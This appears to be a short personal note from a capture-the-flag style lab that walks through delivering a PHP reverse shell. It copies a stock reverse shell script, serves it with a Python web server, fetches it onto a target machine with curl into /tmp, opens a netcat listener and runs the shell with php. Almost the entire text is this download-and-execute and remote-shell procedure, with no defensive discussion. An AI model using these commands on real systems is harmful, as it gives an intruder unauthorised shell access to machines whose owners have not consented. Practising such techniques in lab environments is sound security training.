first created a folder go to the path where you want to host files

	 cd /root/Desktop/THM

here copy the reverse shell


eg 

```
cp /usr/share/webshells/php/php-reverse-shell.php revshell.php
```

<mark style="background: #FF5582A6;">Dont forget to change the IP addr and Port no in the reverse shell</mark>


Now host a webserver in current path using below command


	python3 -m http.server 8000


Now you have hosted a server on you system on port 8000 and all files in foler /root/Desktop/THM 

are available to downlaod for other users in the network


we can use this to download the reverse shell on target machine using below command


```
curl "http://<my - IP>:8000/revshell.php" > /tmp/rev.php
```

will have to update the IP in above command




now start a netcat listener in your system  for the port number you had set in the php reverse shell code

```
nc -lnv 9999
```

Now on the client machine we can execute the reverse shell using below command 


```
php /tmp/rev.php
```




